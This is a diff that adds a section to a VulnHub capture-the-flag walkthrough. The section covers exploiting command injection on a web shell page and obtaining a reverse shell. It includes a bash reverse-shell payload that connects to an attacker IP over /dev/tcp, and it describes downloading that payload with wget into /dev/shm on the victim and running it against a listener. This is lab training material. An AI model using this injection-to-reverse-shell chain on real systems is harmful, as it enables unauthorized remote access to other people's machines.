@@ -89,12 +89,26 @@ now we can go to `/dev/shell` and this page is shown :
 
 here we can run afew commands, but if we use `&&` we can execute another command too, so there is a command injection vulnerability here :
 
+![injection](https://github.com/Git-K3rnel/VulnHub/assets/127470407/6bf10839-4cad-4c49-9237-266ce302abba)
 
+so we can get a reverse shell.
 
+## 3.Gaining Shell
 
+I just made a file with a reverse shell payload in it and called it `shell.sh`:
 
+```bash
+#!/bin/bash
+bash -i >& /dev/tcp/192.168.56.102/4444 0>&1
+```
 
+then served a python http server and used wget to download and put the file in `/dev/shm` directory of the victim :
 
+![wget](https://github.com/Git-K3rnel/VulnHub/assets/127470407/112e8ae4-5a2e-4a00-b748-d05714c81a02)
+
+then start a listener on your machine and just execute it with another bash command :
+
+![bash](https://github.com/Git-K3rnel/VulnHub/assets/127470407/4ce5f34f-db6a-491d-9c66-a4149345860f)
 
 
 
